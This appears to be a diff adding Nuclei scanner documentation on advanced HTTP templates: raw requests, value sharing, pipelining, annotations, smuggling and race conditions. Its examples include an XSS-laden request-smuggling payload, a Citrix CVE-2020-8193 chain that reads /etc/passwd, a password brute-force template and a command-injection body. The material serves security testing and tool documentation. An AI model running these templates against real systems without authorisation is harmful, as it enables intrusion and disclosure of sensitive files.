@@ -1,0 +1,460 @@
+Advanced HTTP
+Unsafe HTTP
+Learn about using rawhttp or unsafe HTTP with Nuclei
+
+Nuclei supports rawhttp for complete request control and customization allowing any kind of malformed requests for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more.
+
+rawhttp library is disabled by default and can be enabled by including unsafe: true in the request block.
+
+Here is an example of HTTP request smuggling detection template using rawhttp.
+
+
+Copy
+http:
+  - raw:
+    - |+
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 150
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /post?postId=5 HTTP/1.1
+        User-Agent: a"/><script>alert(1)</script>
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 5
+
+        x=1
+    - |+
+        GET /post?postId=5 HTTP/1.1
+        Host: {{Hostname}}
+
+    unsafe: true # Enables rawhttp client
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "<script>alert(1)</script>")'
+Advanced HTTP
+Value Sharing
+Learn about sharing values between HTTP requests in the HTTP template.
+
+​
+HTTP Value Sharing
+In Nuclei, It is possible to extract value from one HTTP request and share/reuse it in another HTTP request. This has various use-cases like login, CSRF tokens and other complex.
+
+This concept of value sharing is possible using Dynamic Extractors. Here’s a simple example demonstrating value sharing between HTTP requests.
+
+This template makes a subsequent HTTP requests maintaining sessions between each request, dynamically extracting data from one request and reusing them into another request using variable name and checking for string match against response.
+
+
+Copy
+id: CVE-2020-8193
+
+info:
+  name: Citrix unauthenticated LFI
+  author: pdteam
+  severity: high
+  reference: https://github.com/jas502n/CVE-2020-8193
+
+http:
+  - raw:
+      - |
+        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Content-Type: application/xml
+        X-NITRO-USER: xpyZxwy6
+        X-NITRO-PASS: xWXHUJ56
+
+        <appfwprofile><login></login></appfwprofile>
+
+      - |
+        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.24.0
+        Accept: */*
+        Connection: close
+
+      - |
+        GET /menu/neo HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.24.0
+        Accept: */*
+        Connection: close
+
+      - |
+        GET /menu/stc HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.24.0
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.24.0
+        Accept: */*
+        Connection: close
+        Content-Type: application/xml
+        X-NITRO-USER: oY39DXzQ
+        X-NITRO-PASS: ZuU9Y9c1
+        rand_key: §randkey§
+
+        <appfwprofile><login></login></appfwprofile>
+
+      - |
+        POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: python-requests/2.24.0
+        Accept: */*
+        Connection: close
+        Content-Type: application/xml
+        X-NITRO-USER: oY39DXzQ
+        X-NITRO-PASS: ZuU9Y9c1
+        rand_key: §randkey§
+
+        <clipermission></clipermission>
+
+    cookie-reuse: true # Using cookie-reuse to maintain session between each request, same as browser.
+
+    extractors:
+      - type: regex
+        name: randkey # Variable name
+        part: body
+        internal: true
+        regex:
+          - "(?m)[0-9]{3,10}\\.[0-9]+"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+        part: body
+Advanced HTTP
+Connection Tampering
+Learn more about using HTTP pipelining and connection pooling with Nuclei
+
+​
+Pipelining
+HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from http-desync-attacks-request-smuggling-reborn.
+
+Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallbacks to standard HTTP request engine.
+
+If you want to confirm the given domain or list of subdomains supports HTTP Pipelining, httpx has a flag -pipeline to do so.
+
+An example configuring showing pipelining attributes of nuclei.
+
+
+Copy
+    unsafe: true
+    pipeline: true
+    pipeline-concurrent-connections: 40
+    pipeline-requests-per-connection: 25000
+An example template demonstrating pipelining capabilities of nuclei has been provided below-
+
+
+Copy
+id: pipeline-testing
+info:
+  name: pipeline testing
+  author: pdteam
+  severity: info
+
+http:
+  - raw:
+      - |+
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+
+    attack: batteringram
+    payloads:
+      path: path_wordlist.txt
+
+    unsafe: true
+    pipeline: true
+    pipeline-concurrent-connections: 40
+    pipeline-requests-per-connection: 25000
+
+    matchers:
+      - type: status
+        part: header
+        status:
+          - 200
+​
+Connection pooling
+While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement.
+
+To enable connection pooling in the template, threads attribute can be defined with respective number of threads you wanted to use in the payloads sections.
+
+Connection: Close header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests with pooling.
+
+An example template using HTTP connection pooling-
+
+
+Copy
+id: fuzzing-example
+info:
+  name: Connection pooling example
+  author: pdteam
+  severity: info
+
+http:
+
+  - raw:
+      - |
+        GET /protected HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64('admin:§password§')}}
+
+    attack: batteringram
+    payloads:
+      password: password.txt
+    threads: 40
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Unique string"
+        part: body
+Advanced HTTP
+Request Tampering
+Learn about request tampering in HTTP with Nuclei
+
+​
+Requests Annotation
+Request inline annotations allow performing per request properties/behavior override. They are very similar to python/java class annotations and must be put on the request just before the RFC line. Currently, only the following overrides are supported:
+
+@Host: which overrides the real target of the request (usually the host/ip provided as input). It supports syntax with ip/domain, port, and scheme, for example: domain.tld, domain.tld:port, http://domain.tld:port
+@tls-sni: which overrides the SNI Name of the TLS request (usually the hostname provided as input). It supports any literals. The special value request.host uses the Host header and interactsh-url uses an interactsh generated URL.
+@timeout: which overrides the timeout for the request to a custom duration. It supports durations formatted as string. If no duration is specified, the default Timeout flag value is used.
+The following example shows the annotations within a request:
+
+
+Copy
+- |
+  @Host: https://projectdiscovery.io:443
+  POST / HTTP/1.1
+  Pragma: no-cache
+  Host: {{Hostname}}
+  Cache-Control: no-cache, no-transform
+  User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+This is particularly useful, for example, in the case of templates with multiple requests, where one request after the initial one needs to be performed to a specific host (for example, to check an API validity):
+
+
+Copy
+http:
+  - raw:
+      # this request will be sent to {{Hostname}} to get the token
+      - |
+        GET /getkey HTTP/1.1
+        Host: {{Hostname}}
+        
+      # This request will be sent instead to https://api.target.com:443 to verify the token validity
+      - |
+        @Host: https://api.target.com:443
+        GET /api/key={{token}} HTTP/1.1
+        Host: api.target.com:443
+
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        regex:
+          # random extractor of strings between prefix and suffix
+          - 'prefix(.*)suffix'
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - valid token
+Example of a custom timeout annotations -
+
+
+Copy
+- |
+  @timeout: 25s
+  POST /conf_mail.php HTTP/1.1
+  Host: {{Hostname}}
+  Content-Type: application/x-www-form-urlencoded
+  
+  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M
+Example of sni annotation with interactsh-url -
+
+
+Copy
+- |
+  @tls-sni: interactsh-url
+  POST /conf_mail.php HTTP/1.1
+  Host: {{Hostname}}
+  Content-Type: application/x-www-form-urlencoded
+  
+  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M
+​
+Smuggling
+HTTP Smuggling is a class of Web-Attacks recently made popular by Portswigger’s Research into the topic. For an in-depth overview, please visit the article linked above.
+
+In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the rawhttp engine.
+
+The most basic example of an HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the unsafe: true attribute for rawhttp based requests.
+
+
+Copy
+id: CL-TE-http-smuggling
+
+info:
+  name: HTTP request smuggling, basic CL.TE vulnerability
+  author: pdteam
+  severity: info
+  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
+
+http:
+  - raw:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Connection: keep-alive
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 6
+      Transfer-Encoding: chunked
+      
+      0
+      
+      G      
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Connection: keep-alive
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 6
+      Transfer-Encoding: chunked
+      
+      0
+      
+      G
+            
+    unsafe: true
+    matchers:
+      - type: word
+        words:
+          - 'Unrecognized method GPOST'
+Advanced HTTP
+Race Conditions
+Learn about using race conditions with Nuclei
+
+Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event.
+
+We have implemented Gate mechanism in nuclei engine and allow them run via templates which makes the testing for this specific bug class simple and portable.
+
+To enable race condition check within template, race attribute can be set to true and race_count defines the number of simultaneous request you want to initiate.
+
+Below is an example template where the same request is repeated for 10 times using the gate logic.
+
+
+Copy
+id: race-condition-testing
+
+info:
+  name: Race condition testing
+  author: pdteam
+  severity: info
+
+http:
+  - raw:
+      - |
+        POST /coupons HTTP/1.1
+        Host: {{Hostname}}
+
+        promo_code=20OFF        
+
+    race: true
+    race_count: 10
+
+    matchers:
+      - type: status
+        part: header
+        status:
+          - 200
+You can simply replace the POST request with any suspected vulnerable request and change the race_count as per your need, and it’s ready to run.
+
+
+Copy
+nuclei -t race.yaml -target https://api.target.com
+Multi request race condition testing
+
+For the scenario when multiple requests needs to be sent in order to exploit the race condition, we can make use of threads.
+
+
+Copy
+    threads: 5
+    race: true
+threads is a total number of request you wanted make with the template to perform race condition testing.
+
+Below is an example template where multiple (5) unique request will be sent at the same time using the gate logic.
+
+
+Copy
+id: multi-request-race
+
+info:
+  name: Race condition testing with multiple requests
+  author: pd-team
+  severity: info
+
+http:
+  - raw:  
+      - |
+        POST / HTTP/1.1
+        Pragma: no-cache
+        Host: {{Hostname}}
+        Cache-Control: no-cache, no-transform
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+        id=1
+        
+      - |
+        POST / HTTP/1.1
+        Pragma: no-cache
+        Host: {{Hostname}}
+        Cache-Control: no-cache, no-transform
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+        id=2
+
+      - |
+        POST / HTTP/1.1
+        Pragma: no-cache
+        Host: {{Hostname}}
+        Cache-Control: no-cache, no-transform
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+        id=3
+
+      - |
+        POST / HTTP/1.1
+        Pragma: no-cache
+        Host: {{Hostname}}
+        Cache-Control: no-cache, no-transform
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+        id=4
+
+      - |
+        POST / HTTP/1.1
+        Pragma: no-cache
+        Host: {{Hostname}}
+        Cache-Control: no-cache, no-transform
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+
+        id=5
+
+    threads: 5
+    race: true
